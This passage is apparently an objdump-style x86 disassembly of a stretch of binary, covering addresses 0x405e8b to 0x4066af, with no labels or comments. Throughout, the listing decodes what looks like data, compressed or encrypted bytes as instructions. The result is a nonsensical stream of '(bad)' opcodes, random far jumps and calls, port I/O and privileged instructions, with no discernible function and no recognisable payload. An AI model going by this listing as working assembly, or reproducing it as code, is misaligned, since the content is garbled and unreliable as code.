  405e8b:	das    
  405e8c:	add    al,0x78
  405e8e:	pop    esp
  405e8f:	popa   
  405e90:	mov    eax,ds:0x385c2962
  405e95:	pusha  
  405e96:	js     0x405e77
  405e98:	cmp    al,0x9b
  405e9a:	mov    bl,0x6b
  405e9c:	push   ebx
  405e9d:	or     eax,0x2d9d3ce8
  405ea2:	push   esp
  405ea3:	or     al,0x6a
  405ea5:	fwait
  405ea6:	in     eax,dx
  405ea7:	sub    BYTE PTR [esp+ebp*4+0x61],dh
  405eab:	sub    al,0xc9
  405ead:	mov    BYTE PTR [esi-0x10220b9a],cl
  405eb3:	cwde   
  405eb4:	popa   
  405eb5:	out    0xca,al
  405eb7:	pusha  
  405eb8:	mov    ch,0xde
  405eba:	stos   DWORD PTR es:[edi],eax
  405ebb:	mov    ds:0x476d3f20,eax
  405ec0:	(bad)  
  405ec2:	xor    cl,BYTE PTR [edx+0x33]
  405ec5:	jnp    0x405f35
  405ec7:	lock mov dl,BYTE PTR [edi+0x7900a8c0]
  405ece:	cs adc ch,0x7b
  405ed2:	mov    edi,DWORD PTR [edx-0x12529b6]
  405ed8:	test   DWORD PTR [edx],0x1cc5976b
  405ede:	aaa    
  405edf:	stos   BYTE PTR es:[edi],al
  405ee0:	adc    ecx,0xffffffde
  405ee3:	aaa    
  405ee4:	int    0x1e
  405ee6:	fisub  DWORD PTR [edx+0xc]
  405ee9:	test   DWORD PTR [esi+0x76bc127c],ebp
  405eef:	clc    
  405ef0:	jecxz  0x405ed0
  405ef2:	xchg   DWORD PTR [edx],esi
  405ef4:	aaa    
  405ef5:	lea    ecx,[ebp+ecx*1-0x7eb785ba]
  405efc:	cmp    BYTE PTR [ebx-0x11],ah
  405eff:	(bad)  
  405f01:	clc    
  405f02:	push   edi
  405f03:	push   esi
  405f04:	rcl    DWORD PTR [ecx-0x1dad21f9],cl
  405f0a:	fs iret 
  405f0c:	dec    esp
  405f0d:	inc    edi
  405f0e:	pusha  
  405f0f:	test   cl,ch
  405f11:	(bad)  
  405f12:	outs   dx,DWORD PTR ds:[esi]
  405f13:	pop    es
  405f14:	pushf  
  405f15:	mov    bh,0x46
  405f17:	mov    eax,ds:0xc24d0dfc
  405f1c:	jb     0x405f4d
  405f1e:	cdq    
  405f1f:	mov    esi,0xcd287db1
  405f24:	and    eax,ebp
  405f26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f27:	test   al,0x19
  405f29:	mov    dl,0x17
  405f2b:	shr    DWORD PTR [eax-0x20fc9df9],cl
  405f31:	and    ebp,DWORD PTR [eax]
  405f33:	mov    fs,WORD PTR [edx+0x34a317c7]
  405f39:	cld    
  405f3a:	mov    cl,dh
  405f3c:	or     eax,ebx
  405f3e:	outs   dx,DWORD PTR ds:[esi]
  405f3f:	push   0x77f7c369
  405f44:	rcl    DWORD PTR [eax+0x72e34ac5],cl
  405f4a:	mov    dh,bh
  405f4c:	inc    esp
  405f4d:	or     DWORD PTR [edx],edi
  405f4f:	idiv   BYTE PTR [ebp+ebx*2-0x2105a4b3]
  405f56:	pushf  
  405f57:	push   ecx
  405f58:	xor    BYTE PTR [edi-0x3d],ch
  405f5b:	xor    dl,BYTE PTR [edi-0x70]
  405f5e:	xor    BYTE PTR [esi],dh
  405f60:	cmp    eax,0xff767351
  405f65:	sub    al,0x78
  405f67:	xlat   BYTE PTR ds:[ebx]
  405f68:	retf   0x97ea
  405f6b:	(bad)  
  405f6d:	(bad)  
  405f6e:	sbb    BYTE PTR fs:[esi+0x24],bh
  405f72:	in     al,dx
  405f73:	jo     0x405f12
  405f75:	xchg   ebp,eax
  405f76:	out    0x4f,eax
  405f78:	and    BYTE PTR [esi+0x32],bl
  405f7b:	dec    esi
  405f7c:	xor    ebx,DWORD PTR [esi+0x24160c15]
  405f82:	in     al,0xa8
  405f84:	(bad)  [ebx+0x35]
  405f87:	jne    0x405ff5
  405f89:	fisub  DWORD PTR [edi+0x12]
  405f8c:	sbb    BYTE PTR [edx+0xf],0x63
  405f90:	shl    BYTE PTR [edx-0x4f41ef80],cl
  405f96:	pop    DWORD PTR [edi-0x7c71fdfe]
  405f9c:	out    dx,eax
  405f9d:	inc    edi
  405f9e:	jmp    0x405f59
  405fa0:	cld    
  405fa1:	sub    edi,DWORD PTR [ebx-0x3a]
  405fa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fa5:	aas    
  405fa6:	mov    dh,0x6d
  405fa8:	sbb    eax,0x9847eee0
  405fad:	(bad)  
  405fae:	lea    ebx,[ebp-0x4d]
  405fb1:	cmp    eax,0x97282091
  405fb6:	and    al,0x8
  405fb8:	(bad)  
  405fb9:	fcom   DWORD PTR [eax-0x52]
  405fbc:	cmp    eax,0xc4c13665
  405fc1:	gs mov edx,0xd6d84630
  405fc7:	jp     0x405f7a
  405fc9:	idiv   DWORD PTR [esi+0x417e7993]
  405fcf:	pop    esp
  405fd0:	mov    esi,gs
  405fd2:	sbb    al,0xb7
  405fd4:	pop    ebx
  405fd5:	dec    DWORD PTR es:[ecx+0x37c9ad38]
  405fdc:	fcomp  DWORD PTR [edx]
  405fde:	test   BYTE PTR [edi+0x4281c405],cl
  405fe4:	mov    edi,0xc2730a34
  405fe9:	loopne 0x40605e
  405feb:	jnp    0x405fd0
  405fed:	popa   
  405fee:	jbe    0x406000
  405ff0:	fwait
  405ff1:	popf   
  405ff2:	lea    ebp,[esi+0x4]
  405ff5:	sub    al,0xf7
  405ff7:	push   ebp
  405ff8:	cmp    eax,0xf9776491
  405ffd:	pop    es
  405ffe:	or     eax,esi
  406000:	jno    0x405fce
  406002:	jecxz  0x405fa1
  406004:	ja     0x406027
  406006:	mov    ds:0xf9618069,al
  40600b:	out    0x57,eax
  40600d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40600e:	mov    eax,0x8c5ca79b
  406013:	repz mov eax,0xe06e7fd7
  406019:	fistp  WORD PTR [ebx+ebp*1+0x23]
  40601d:	pushf  
  40601e:	jnp    0x406068
  406020:	push   0x859b5db1
  406025:	pop    esp
  406026:	inc    esp
  406027:	add    bh,ah
  406029:	xchg   BYTE PTR [ecx-0x12],bl
  40602c:	adc    eax,0x822fdfd3
  406031:	and    BYTE PTR [ebx-0x12],0x41
  406035:	sub    eax,0xd9aa3df7
  40603a:	mov    ebp,0x14eb3a1
  40603f:	pop    edx
  406040:	pop    esi
  406041:	mov    bl,0xab
  406043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406044:	push   edx
  406045:	ret    0x6ad0
  406048:	push   0x32b126ff
  40604d:	cmp    eax,DWORD PTR [edx+0x3ea6155f]
  406053:	sub    BYTE PTR [eax+0x51],al
  406056:	stos   BYTE PTR es:[edi],al
  406057:	bound  esi,QWORD PTR [eax+eax*1+0x6074725c]
  40605e:	cmp    BYTE PTR [bx],0x97
  406062:	and    bl,BYTE PTR [esi]
  406064:	lods   al,BYTE PTR ds:[esi]
  406065:	cwde   
  406066:	cmp    ecx,0x36366ac
  40606c:	mov    ds:0x4332f0f3,al
  406071:	mov    bh,0xae
  406073:	sub    esp,DWORD PTR [esi-0x4b2fb4e5]
  406079:	inc    ecx
  40607a:	jp     0x406026
  40607c:	loope  0x406031
  40607e:	shl    DWORD PTR [ebx],0x13
  406081:	add    esi,DWORD PTR [edi-0xf]
  406084:	inc    ebp
  406085:	mov    ss,WORD PTR fs:0xe2de90e5
  40608c:	addr16 mov cl,0x48
  40608f:	lods   eax,DWORD PTR ds:[esi]
  406090:	out    dx,eax
  406091:	test   DWORD PTR [ebx],edi
  406093:	arpl   WORD PTR [esi],cx
  406095:	mov    esi,0x5b5946a5
  40609a:	mov    bh,0x36
  40609c:	popf   
  40609d:	mov    al,ds:0xc422586a
  4060a2:	out    0x79,eax
  4060a4:	or     eax,0x43713244
  4060a9:	popa   
  4060aa:	sti    
  4060ab:	jp     0x406059
  4060ad:	lea    edi,[eax+0x48]
  4060b0:	cmp    BYTE PTR [ecx],cl
  4060b2:	cmc    
  4060b3:	add    bl,BYTE PTR [ebx-0x30aa4737]
  4060b9:	jmp    0xa617:0xb0d0577
  4060c0:	cli    
  4060c1:	push   esp
  4060c2:	and    ebx,eax
  4060c4:	mov    ebp,0xb8feb0ad
  4060c9:	jnp    0x4060f9
  4060cb:	inc    edi
  4060cc:	loopne 0x406100
  4060ce:	outs   dx,DWORD PTR ds:[esi]
  4060cf:	out    dx,al
  4060d0:	fst    QWORD PTR ds:0x392246d7
  4060d6:	cmp    ah,BYTE PTR [ecx-0x4df075f5]
  4060dc:	ficomp DWORD PTR ds:0xce8b8860
  4060e2:	and    DWORD PTR [ebx],ebp
  4060e4:	outs   dx,BYTE PTR ds:[esi]
  4060e5:	add    esp,DWORD PTR [ecx+0x5f95cf52]
  4060eb:	in     al,0xdb
  4060ed:	mov    DWORD PTR [ebp+0x1f],edx
  4060f0:	mov    al,ds:0x77b755d9
  4060f5:	adc    DWORD PTR [esi],ecx
  4060f7:	mov    esp,0xd2e8f12
  4060fc:	mov    DWORD PTR [edi],0x86d1578c
  406102:	push   ebp
  406103:	ss sbb eax,0xbc69392e
  406109:	les    eax,FWORD PTR [edx-0x68]
  40610c:	ds cld 
  40610e:	or     ebp,DWORD PTR ds:0x9823fb8e
  406114:	jb     0x40614b
  406116:	jns    0x4060f4
  406118:	jmp    FWORD PTR [eax]
  40611a:	cmp    al,dl
  40611c:	sub    al,0x22
  40611e:	punpcklwd mm7,DWORD PTR [esp+esi*2+0x33bbd0b4]
  406126:	xor    DWORD PTR [esi+edi*1+0x1b],edx
  40612a:	xchg   esi,eax
  40612b:	popf   
  40612c:	ins    DWORD PTR es:[edi],dx
  40612d:	mov    dh,0x58
  40612f:	repz push esp
  406131:	loopne 0x406169
  406133:	cs test eax,0x937afef8
  406139:	call   0x7d12:0xa58b26cb
  406140:	pop    ds
  406141:	mov    eax,0x4faa4b7d
  406146:	mov    cl,dl
  406148:	dec    eax
  406149:	idiv   dl
  40614b:	pop    esp
  40614c:	xor    DWORD PTR [ecx+0x73],edx
  40614f:	push   ds
  406150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406151:	jge    0x40610f
  406153:	ins    DWORD PTR es:[edi],dx
  406154:	loopne 0x4060db
  406156:	arpl   WORD PTR [esi+0x66],sp
  406159:	test   DWORD PTR [edx+0x4d5a22ac],ecx
  40615f:	js     0x4060e3
  406161:	sub    eax,0x801b8498
  406166:	pop    ebp
  406167:	imul   eax,eax,0x59
  40616a:	retf   0xf0bf
  40616d:	cld    
  40616e:	hlt    
  40616f:	std    
  406170:	jnp    0x4061c7
  406172:	mov    eax,ds:0x55b282e
  406177:	push   edi
  406178:	and    BYTE PTR [eax-0x537584f9],bl
  40617e:	and    al,BYTE PTR [eax+ecx*8]
  406181:	(bad)  
  406182:	fsubrp st(5),st
  406184:	push   ebx
  406185:	pop    eax
  406186:	cmp    ecx,DWORD PTR [eax+ebx*4]
  406189:	loop   0x4061c3
  40618b:	fs adc al,0xf1
  40618e:	mov    DWORD PTR [ebp+0x5c],esi
  406191:	rcr    bl,1
  406193:	jmp    DWORD PTR [ecx-0x23ac5af7]
  406199:	cmc    
  40619a:	jmp    0x25a2:0x4e5fad08
  4061a1:	sub    esp,DWORD PTR [eax-0x23dcf5ed]
  4061a7:	jae    0x406199
  4061a9:	daa    
  4061aa:	jb     0x40619e
  4061ac:	mov    dh,0x58
  4061ae:	xchg   edi,eax
  4061af:	frstor [ebp+0x669a87b7]
  4061b5:	xor    DWORD PTR [eax-0x5d091c18],ebx
  4061bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061bc:	daa    
  4061bd:	xchg   BYTE PTR [edi-0x15905fbc],ah
  4061c3:	mov    eax,ds:0x9e67c9ee
  4061c8:	fist   WORD PTR [edx-0x3efbc5ff]
  4061ce:	pop    edx
  4061cf:	pushf  
  4061d0:	es mov esi,0x972a189b
  4061d6:	mov    ds:0xd279737b,al
  4061db:	add    DWORD PTR [edx+0x7b76221b],0x51
  4061e2:	jo     0x40617a
  4061e4:	shl    BYTE PTR [ecx+0x3a],1
  4061e7:	daa    
  4061e8:	xor    DWORD PTR [eax],0x1a
  4061eb:	shr    esi,1
  4061ed:	push   0xffffffac
  4061ef:	or     DWORD PTR [ebx-0xc],esi
  4061f2:	push   cs
  4061f3:	or     DWORD PTR [edx+eiz*4+0x7a],ebp
  4061f7:	sub    edx,ecx
  4061f9:	call   0xba50:0xad6746cb
  406200:	pushf  
  406201:	fcom   DWORD PTR [ebx+eax*1-0x72]
  406205:	cs loop 0x40627a
  406208:	ror    DWORD PTR [ebx+0x53f048c4],0x97
  40620f:	imul   dh
  406211:	aas    
  406212:	pusha  
  406213:	cmp    al,al
  406215:	xchg   ch,al
  406217:	mov    cl,0x61
  406219:	test   DWORD PTR ss:[ebx+edx*4+0x6e],0xb09077f4
  406222:	push   eax
  406223:	fsub   DWORD PTR [ecx-0x4734f2e8]
  406229:	jmp    0x5c9a:0xd37f8162
  406230:	fsubr  DWORD PTR [ebx]
  406232:	mov    ds:0x479b28e4,eax
  406237:	pushf  
  406238:	lock add bh,BYTE PTR ds:0x95e15d71
  40623f:	or     cl,ah
  406241:	jmp    0x4062b8
  406243:	or     esi,ebx
  406245:	sub    DWORD PTR [edi-0x65],edx
  406248:	push   0xffffff96
  40624a:	arpl   WORD PTR [ebx],di
  40624c:	out    dx,eax
  40624d:	sub    esp,DWORD PTR [edi]
  40624f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406250:	xchg   DWORD PTR [ebp+0x330bcd47],esp
  406256:	es jb  0x406229
  406259:	neg    DWORD PTR [edx-0x64cd0f2c]
  40625f:	push   esi
  406260:	clc    
  406261:	jp     0x406294
  406263:	push   ss
  406264:	and    al,0x7
  406266:	jae    0x406254
  406268:	xor    DWORD PTR [ebp+0x6ba13473],ebx
  40626e:	fsub   QWORD PTR [ebx]
  406270:	cld    
  406271:	sbb    eax,0x7f270308
  406276:	adc    al,0x32
  406278:	ins    DWORD PTR es:[edi],dx
  406279:	shl    BYTE PTR [edi+0x4b],1
  40627c:	pop    ss
  40627d:	sub    dl,BYTE PTR [edx]
  40627f:	into   
  406280:	xor    ah,ah
  406282:	test   eax,0x1ffcc05a
  406287:	push   edi
  406288:	outs   dx,BYTE PTR ds:[esi]
  406289:	popa   
  40628a:	dec    edx
  40628b:	jnp    0x406261
  40628d:	pop    ecx
  40628e:	jae    0x406224
  406290:	popa   
  406291:	mov    edi,0x4d9c353c
  406296:	sbb    dl,dl
  406298:	xchg   esi,eax
  406299:	inc    ebx
  40629a:	jo     0x4062aa
  40629c:	add    ebx,DWORD PTR [edi]
  40629e:	jno    0x40622a
  4062a0:	dec    edi
  4062a1:	call   0x3d39:0x1fa92c33
  4062a8:	mov    edx,0x3c0dcb04
  4062ad:	xor    BYTE PTR [edi-0x271bd42c],bh
  4062b3:	xlat   BYTE PTR ds:[ebx]
  4062b4:	loop   0x406277
  4062b6:	adc    BYTE PTR [ecx],bl
  4062b8:	jge    0x40624b
  4062ba:	repz xchg ebx,eax
  4062bc:	std    
  4062bd:	pop    edi
  4062be:	push   ebp
  4062bf:	jmp    0x98630463
  4062c4:	fld    st(7)
  4062c6:	les    ebp,FWORD PTR [eax+0x5021bd3b]
  4062cc:	mov    ah,0x2d
  4062ce:	int3   
  4062cf:	mov    eax,ds:0x44c1c45a
  4062d4:	sbb    bh,bh
  4062d6:	and    DWORD PTR [ecx+0x6de9f6ec],ecx
  4062dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062dd:	ret    0xd0da
  4062e0:	lock jle 0x40626a
  4062e3:	loopne 0x4062b7
  4062e5:	(bad)  
  4062e6:	(bad)  
  4062e7:	test   DWORD PTR [ecx],0xf8ed2637
  4062ed:	inc    esi
  4062ee:	cdq    
  4062ef:	jmp    0xd6c9:0x89c10a10
  4062f6:	mov    ah,0x18
  4062f8:	mov    cl,bl
  4062fa:	ficom  DWORD PTR [ecx]
  4062fc:	in     eax,dx
  4062fd:	mov    gs,WORD PTR [edi+0x3d0ffabe]
  406303:	rol    dh,1
  406305:	xor    BYTE PTR [edx],dl
  406307:	sub    BYTE PTR [eax-0x37],0x95
  40630b:	mov    cl,0x42
  40630d:	test   DWORD PTR [eax],edi
  40630f:	lock add al,0x9e
  406312:	mov    edx,0x94fcae19
  406317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406318:	js     0x4062de
  40631a:	sti    
  40631b:	pushf  
  40631c:	outs   dx,BYTE PTR ds:[esi]
  40631d:	not    ebx
  40631f:	jmp    0x8403:0x14e71ed0
  406326:	imul   edi,DWORD PTR [ebx-0x7d5ccf33],0x71a7d69e
  406330:	sbb    BYTE PTR [esi],dh
  406332:	mov    esp,0xfa2ec8f1
  406337:	fst    QWORD PTR [edx+0x6b]
  40633a:	push   edi
  40633b:	imul   ebp,DWORD PTR [eax+0x3ca19d53],0xa112b8b2
  406345:	and    eax,DWORD PTR [ebp+0x40]
  406348:	or     dh,BYTE PTR [esi+ebx*4+0xf92796f]
  40634f:	dec    ecx
  406350:	sbb    DWORD PTR [ecx+0x6fae686a],edi
  406356:	cld    
  406357:	and    al,0x37
  406359:	ror    DWORD PTR [esi-0x7a],cl
  40635c:	jle    0x4063ab
  40635e:	(bad)
  406362:	ins    DWORD PTR es:[edi],dx
  406363:	pop    ss
  406364:	pop    esi
  406365:	jmp    0x4063d2
  406367:	int3   
  406368:	test   BYTE PTR [ecx+ebp*4-0x2b],ch
  40636c:	jae    0x406399
  40636e:	pop    eax
  40636f:	or     eax,0x3d716468
  406374:	rol    BYTE PTR [edx],1
  406376:	leave  
  406377:	hlt    
  406378:	sbb    eax,0x35af0cf4
  40637d:	or     ch,bh
  40637f:	call   0x41c9:0x4e0f045c
  406386:	mov    ecx,0xef447dcb
  40638b:	loop   0x4063da
  40638d:	jns    0x406348
  40638f:	stos   BYTE PTR es:[edi],al
  406390:	clc    
  406391:	clc    
  406392:	pop    es
  406393:	hlt    
  406394:	lock pop esp
  406396:	addr16 (bad) 
  406398:	jne    0x406368
  40639a:	push   esi
  40639b:	(bad)
  40639e:	addr16 pop ss
  4063a0:	ret    0x6b36
  4063a3:	enter  0x296c,0x8d
  4063a7:	xor    DWORD PTR [edi-0x5],ebp
  4063aa:	fcomip st,st(7)
  4063ac:	shl    BYTE PTR ds:0x57e7dc74,cl
  4063b2:	iret   
  4063b3:	push   esp
  4063b4:	adc    dl,BYTE PTR [ebx]
  4063b6:	pop    ebp
  4063b7:	fld    QWORD PTR [ecx+edx*4]
  4063ba:	enter  0x1ba2,0x94
  4063be:	mov    bl,0x37
  4063c0:	outs   dx,BYTE PTR ds:[esi]
  4063c1:	(bad)  
  4063c2:	clc    
  4063c3:	dec    ebp
  4063c4:	sub    al,0x47
  4063c6:	js     0x4063b3
  4063c8:	loopne 0x406383
  4063ca:	xchg   ebx,eax
  4063cb:	xchg   ebx,eax
  4063cc:	add    edi,esp
  4063ce:	adc    DWORD PTR [ebp-0x6793f53d],esp
  4063d4:	push   ebx
  4063d5:	int    0xe7
  4063d7:	pop    es
  4063d8:	ins    DWORD PTR es:[edi],dx
  4063d9:	movnti DWORD PTR [edi],ebx
  4063dc:	stos   BYTE PTR es:[edi],al
  4063dd:	sbb    al,0x1d
  4063df:	jg     0x4063e1
  4063e1:	pop    ebp
  4063e2:	jno    0x406383
  4063e4:	and    eax,0x6f8acc06
  4063e9:	in     eax,0x19
  4063eb:	adc    dh,BYTE PTR [eax-0x4f]
  4063ee:	xor    eax,0xd04dc59f
  4063f3:	lods   eax,DWORD PTR ds:[esi]
  4063f4:	sahf   
  4063f5:	shl    bh,cl
  4063f7:	nop
  4063f8:	pop    ds
  4063f9:	sahf   
  4063fa:	imul   BYTE PTR [ecx+0x2dd59351]
  406400:	push   ss
  406401:	xor    al,0x40
  406403:	sbb    edi,DWORD PTR [eax]
  406405:	dec    ecx
  406406:	cmp    eax,0x36cb2a5f
  40640b:	dec    ebx
  40640c:	add    eax,0xb788b7a9
  406411:	into   
  406412:	xchg   DWORD PTR [edx-0x2e95c461],esp
  406418:	outs   dx,DWORD PTR ds:[esi]
  406419:	gs push esi
  40641b:	outs   dx,DWORD PTR ds:[esi]
  40641c:	jg     0x40640e
  40641e:	adc    eax,0xa31481fb
  406423:	dec    ecx
  406424:	mov    ecx,0x6f809745
  406429:	adc    eax,0x72d668fe
  40642e:	add    edx,edi
  406430:	sub    al,0x80
  406432:	jae    0x40644c
  406434:	pop    ebp
  406435:	jb     0x406403
  406437:	sahf   
  406438:	jnp    0x40646f
  40643a:	cmp    eax,0x9c6ef31e
  40643f:	daa    
  406440:	scas   eax,DWORD PTR es:[edi]
  406441:	int3   
  406442:	cli    
  406443:	cmp    al,0x53
  406445:	cwde   
  406446:	dec    ebp
  406447:	scas   eax,DWORD PTR es:[edi]
  406448:	and    BYTE PTR [edi-0x45],bh
  40644b:	scas   al,BYTE PTR es:[edi]
  40644c:	sub    bh,0xe3
  40644f:	add    dl,al
  406451:	stos   BYTE PTR es:[edi],al
  406452:	dec    esp
  406453:	sub    DWORD PTR [eax-0x47],esp
  406456:	mov    al,ds:0xfd03e89a
  40645b:	mov    ?,esi
  40645d:	xor    BYTE PTR [eax-0x3f93988b],0x67
  406464:	jle    0x40646c
  406466:	mov    al,0xd0
  406468:	ror    DWORD PTR [ecx],0xc4
  40646b:	mov    ds:0x6f5847b8,al
  406470:	pop    edx
  406471:	mov    edx,0x2bee39
  406476:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406477:	add    DWORD PTR [ebp+0x74],0xb683bfa3
  40647e:	jno    0x406404
  406480:	cmp    ch,BYTE PTR [ebx]
  406482:	ins    BYTE PTR es:[edi],dx
  406483:	sub    dl,BYTE PTR [ecx]
  406485:	test   DWORD PTR [esi+ecx*2],eax
  406488:	aas    
  406489:	test   eax,0x22ede0bd
  40648e:	adc    eax,0xf9a1eb0b
  406493:	xor    DWORD PTR [esi],ebx
  406495:	mov    ebx,DWORD PTR [edi+0x3c]
  406498:	ja     0x4064ed
  40649a:	jl     0x40644b
  40649c:	in     al,0x24
  40649e:	rol    DWORD PTR [ebp+0x5f],1
  4064a1:	lods   eax,DWORD PTR ds:[esi]
  4064a2:	xchg   esp,eax
  4064a3:	mov    ecx,0xabc185bd
  4064a8:	mov    al,ds:0x50bcb8c6
  4064ad:	scas   al,BYTE PTR es:[edi]
  4064ae:	sub    dh,BYTE PTR [edi]
  4064b0:	lea    esp,[esp+edx*2-0x50]
  4064b4:	aaa    
  4064b5:	mov    eax,ds:0x431274e9
  4064ba:	ins    BYTE PTR es:[edi],dx
  4064bb:	or     eax,0x7cd249dc
  4064c0:	lods   al,BYTE PTR ds:[esi]
  4064c1:	inc    DWORD PTR ds:0x63107255
  4064c7:	jmp    0x9232adb6
  4064cc:	pop    ebx
  4064cd:	add    al,dl
  4064cf:	xlat   BYTE PTR ds:[ebx]
  4064d0:	push   esp
  4064d1:	hlt    
  4064d2:	or     eax,0xe981b1f1
  4064d7:	cld    
  4064d8:	push   ebp
  4064d9:	push   esp
  4064db:	jne    0x4064ee
  4064dd:	cdq    
  4064de:	push   0x7b079a8f
  4064e3:	or     eax,0x65dc7d05
  4064e8:	jmp    0x406539
  4064ea:	fwait
  4064eb:	lods   eax,DWORD PTR ds:[esi]
  4064ec:	xchg   edi,eax
  4064ed:	adc    al,0xce
  4064ef:	in     eax,0xcb
  4064f1:	lahf   
  4064f2:	jae    0x4064a2
  4064f4:	leave  
  4064f5:	ins    BYTE PTR es:[edi],dx
  4064f6:	dec    edx
  4064f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064f8:	xchg   edx,eax
  4064f9:	and    edx,DWORD PTR [ecx+0x4f6c19e5]
  4064ff:	cdq    
  406500:	call   0xc0aa53af
  406505:	jg     0x406580
  406507:	inc    ebp
  406508:	inc    DWORD PTR [ecx-0x4]
  40650b:	cdq    
  40650c:	lea    ebp,[edi+ebx*8+0x76b95731]
  406513:	loope  0x40654f
  406515:	ret    
  406516:	xchg   esp,eax
  406517:	inc    edi
  406518:	xchg   esi,eax
  406519:	jo     0x406527
  40651b:	test   DWORD PTR [esi-0x2d74dd18],esi
  406521:	retf   
  406522:	in     eax,0x15
  406524:	lods   al,BYTE PTR ds:[esi]
  406525:	pop    ss
  406526:	adc    eax,0x67b6d7df
  40652b:	dec    esi
  40652c:	and    bh,BYTE PTR [eax-0x3f]
  40652f:	inc    edx
  406530:	dec    BYTE PTR [ecx]
  406532:	mov    ds:0x81f4bf9,al
  406538:	inc    ecx
  406539:	test   al,0x1f
  40653b:	mov    fs,WORD PTR [ebx]
  40653d:	adc    esp,esp
  40653f:	enter  0x888b,0xbb
  406543:	stos   BYTE PTR es:[edi],al
  406544:	adc    BYTE PTR [edx+0x28],ch
  406547:	jmp    0x9d60:0xd2784d97
  40654e:	mov    ss,WORD PTR [ecx-0x653d9a78]
  406554:	fdiv   st,st(0)
  406556:	mov    ss,ebx
  406558:	mov    DWORD PTR [esi],eax
  40655a:	pop    edi
  40655b:	ret    0xb2c0
  40655e:	aad    0x28
  406560:	pop    bp
  406562:	or     eax,0x23f473ea
  406567:	pop    ebx
  406568:	ret    
  406569:	retf   
  40656a:	jae    0x40657b
  40656c:	ss push 0x7ed987bb
  406572:	cmc    
  406573:	fmul   QWORD PTR [ebx-0x78365f55]
  406579:	repz dec eax
  40657b:	pop    esp
  40657c:	test   eax,ebx
  40657e:	or     ebx,DWORD PTR [edx]
  406580:	and    al,0xe1
  406582:	inc    edx
  406583:	jb     0x40658b
  406585:	inc    ecx
  406586:	mov    ecx,0x44191d1c
  40658b:	mov    ecx,0xffb2dcdd
  406590:	lods   eax,DWORD PTR ds:[esi]
  406591:	mov    edi,0xcb395cda
  406596:	js     0x406554
  406598:	xor    cl,cl
  40659a:	mov    esp,0x90222ab1
  40659f:	dec    ebp
  4065a0:	test   BYTE PTR [edi+ebp*4],0xab
  4065a4:	push   ebx
  4065a5:	add    DWORD PTR [ecx],edx
  4065a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065a8:	fsub   QWORD PTR [eax]
  4065aa:	imul   edi,DWORD PTR [eax],0xcb416e7
  4065b0:	pop    es
  4065b1:	ja     0x4065a6
  4065b3:	mov    WORD PTR [ebx],gs
  4065b5:	pushf  
  4065b6:	xchg   BYTE PTR [ebp+0x37716e81],cl
  4065bc:	add    eax,0x65b1ed7
  4065c1:	add    bl,BYTE PTR [ebp-0x52501e4b]
  4065c7:	and    DWORD PTR [ecx+esi*4-0x5f6155cb],0x57b21653
  4065d2:	sub    al,0x99
  4065d4:	jmp    0xd1b8:0xb87d14a7
  4065db:	add    al,0x66
  4065dd:	push   ebx
  4065de:	and    al,0xf4
  4065e0:	dec    ebp
  4065e1:	xor    DWORD PTR [edi-0x5d],eax
  4065e4:	add    DWORD PTR es:[edi-0x73],eax
  4065e8:	or     al,0x21
  4065ea:	xchg   edx,eax
  4065eb:	test   DWORD PTR [edi+0x6b3e8006],0x597a3acf
  4065f5:	test   eax,0xa03e88fd
  4065fa:	jb     0x406630
  4065fc:	mov    ss,WORD PTR [edi]
  4065fe:	fmul   QWORD PTR [ecx+0x3b]
  406601:	dec    eax
  406602:	push   edx
  406603:	sub    DWORD PTR [ecx+0x9],edi
  406606:	retf   
  406607:	and    DWORD PTR [ecx],edi
  406609:	mov    ds:0x3ec584a5,eax
  40660e:	jnp    0x40668f
  406610:	in     al,dx
  406611:	out    dx,al
  406612:	adc    al,BYTE PTR [esi]
  406614:	shr    DWORD PTR [ebp+0x3d],0x54
  406618:	add    ch,ah
  40661a:	lock call 0xe963:0xabd3db96
  406622:	popf   
  406623:	dec    ecx
  406624:	cmp    BYTE PTR [esi-0x61],ch
  406627:	add    eax,0x8845522d
  40662c:	push   ebx
  40662d:	ret    
  40662e:	out    dx,al
  40662f:	jl     0x40660f
  406631:	ret    0xd904
  406634:	out    0xdb,eax
  406636:	pop    eax
  406637:	jge    0x4066b0
  406639:	dec    esi
  40663a:	aad    0x43
  40663c:	pop    eax
  40663d:	jns    0x4066b4
  40663f:	add    ecx,ecx
  406641:	les    esi,FWORD PTR [edx]
  406643:	outs   dx,DWORD PTR ds:[esi]
  406644:	cs dec ebx
  406646:	ins    DWORD PTR es:[edi],dx
  406647:	aas    
  406648:	clc    
  406649:	jp     0x406692
  40664b:	or     eax,0xb78bcd58
  406650:	mov    edx,0x685397dd
  406655:	sub    eax,0x311d77f0
  40665a:	xchg   esp,eax
  40665b:	push   0x22f817bf
  406660:	shl    DWORD PTR [edx-0x21354d3a],0xdd
  406667:	pop    eax
  406668:	stos   BYTE PTR es:[edi],al
  406669:	inc    eax
  40666a:	and    ebx,edi
  40666c:	xchg   ebx,eax
  40666d:	imul   edi,ebx,0xe3ac3be8
  406673:	les    edi,FWORD PTR [esi+0x7b]
  406676:	icebp  
  406677:	in     eax,0x4e
  406679:	jno    0x4066ab
  40667b:	dec    ecx
  40667c:	arpl   WORD PTR [eax+0x293d2be],si
  406682:	fld    DWORD PTR [esi+edi*2+0x26e0f48d]
  406689:	test   DWORD PTR [edi-0x674074a2],edx
  40668f:	jno    0x406698
  406691:	(bad)  
  406692:	fisubr DWORD PTR [edx-0x6a]
  406695:	pushf  
  406696:	nop
  406697:	mov    esi,0x22dc1210
  40669c:	add    ch,bh
  40669e:	leave  
  40669f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066a0:	out    0xae,al
  4066a2:	and    BYTE PTR [esi-0x16408b1b],al
  4066a8:	jbe    0x4066a7
  4066aa:	mov    esp,0xbc547e7c
  4066af:	test   eax,0x4e30b162
